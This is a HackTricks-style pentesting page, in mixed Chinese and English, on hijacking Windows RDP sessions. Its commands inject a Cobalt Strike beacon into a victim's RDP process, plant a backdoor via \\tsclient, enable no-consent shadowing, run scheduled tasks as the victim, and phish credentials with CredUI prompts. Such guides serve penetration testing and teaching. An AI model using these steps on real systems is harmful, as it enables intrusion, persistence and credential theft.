# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

如果 **external group** 对当前域中的任何 **computer** 拥有 **RDP access**，**attacker** 可以 **compromise that computer and wait for him**。

一旦该用户通过 RDP 访问，**attacker can pivot to that users session** 并滥用其在外部域的权限。
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
查看 **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

如果用户通过 **RDP into a machine** 访问一台机器，而一个 **attacker** 正在 **waiting**，攻击者将能够 **inject a beacon in the RDP session of the user**。如果 **victim mounted his drive** 在通过 **RDP** 访问时，**attacker could access it**。

在这种情况下，你可以通过在 **statup folder** 中写入一个 **backdoor** 来直接 **compromise** **victims** **original computer**。
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

如果你在受害者已经在该主机上拥有 **active RDP session**，并且你是该主机的 **local admin**，你可能能够 **查看/控制该桌面，而无需窃取密码或转储 LSASS**。

这取决于存储在以下位置的 **Remote Desktop Services shadowing** 策略：
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
有趣的值：

- `0`: 已禁用
- `1`: `EnableInputNotify` (控制，需要用户批准)
- `2`: `EnableInputNoNotify` (控制，**无需用户批准**)
- `3`: `EnableNoInputNotify` (仅查看，需要用户批准)
- `4`: `EnableNoInputNoNotify` (仅查看，**无需用户批准**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
当一位通过 RDP 连接的特权用户留下未锁定的桌面、KeePass 会话、MMC 控制台、浏览器会话或 admin shell 开着时，这一点尤其有用。

## Scheduled Tasks As Logged-On User

如果你是 **local admin** 且目标用户 **currently logged on**，Task Scheduler 可以在 **无需其密码的情况下以该用户身份** 启动代码。

这会把受害者现有的登录会话转变为一个执行原语：
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
注意事项：

- 如果用户 **not logged on**，Windows 通常需要密码才能创建以该用户身份运行的任务。
- 如果用户 **is logged on**，该任务可以重用现有的登录上下文。
- 这是一种在受害者会话内执行 GUI 操作或启动二进制程序而不接触 LSASS 的实用方法。

## CredUI Prompt Abuse From the Victim Session

一旦你能够在**受害者的交互式桌面内执行**（例如通过 **Shadow RDP** 或 **a scheduled task running as that user**），你就可以使用 CredUI APIs 显示一个**真实的 Windows credential prompt**，并收集受害者输入的凭据。

Relevant APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Typical flow:

1. 在受害者会话中启动一个二进制文件。
2. 显示与当前域品牌匹配的域身份验证提示。
3. 解包返回的身份验证缓冲区。
4. 验证提供的凭据，并可选择性地继续提示直到输入有效凭据为止。

这对 **on-host phishing** 很有用，因为该提示由标准 Windows APIs 呈现，而不是伪造的 HTML 表单。

## Requesting a PFX In the Victim Context

相同的 **scheduled-task-as-user** 原语可用于请求 **certificate/PFX as the logged-on victim**。该证书随后可用于作为该用户的 **AD authentication**，从而完全避免窃取密码。

High-level flow:

1. 在受害者已登录的主机上获得 **local admin**。
2. 使用 **scheduled task** 以受害者身份运行注册/导出逻辑。
3. 导出生成的 **PFX**。
4. 使用该 PFX 用于 PKINIT / 基于证书的 AD 身份验证。

See the AD CS pages for follow-up abuse:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
